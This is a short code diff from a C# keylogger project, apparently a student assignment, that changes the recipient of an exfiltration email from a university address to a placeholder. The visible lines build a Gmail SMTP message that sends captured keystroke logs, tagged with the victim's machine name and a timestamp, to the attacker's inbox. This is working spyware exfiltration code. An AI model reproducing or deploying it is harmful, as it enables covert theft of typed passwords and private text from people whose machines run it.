@@ -52,7 +52,7 @@ namespace KeyLogger_NTP_Odev
             MailMessage mail = new MailMessage();
             SmtpClient smtp = new SmtpClient("smtp.gmail.com");
             mail.From = new MailAddress("testkeylogger458@gmail.com");
-            mail.To.Add("240542014@firat.edu.tr");
+            mail.To.Add("Your email adress");
             mail.Subject = "KeyLog from" + System.Environment.MachineName;
             mail.Body ="New Log from"+DateTime.Now.ToString()+log;
             
@@ -147,4 +147,5 @@ namespace KeyLogger_NTP_Odev
             }
         }
     }
+
 }
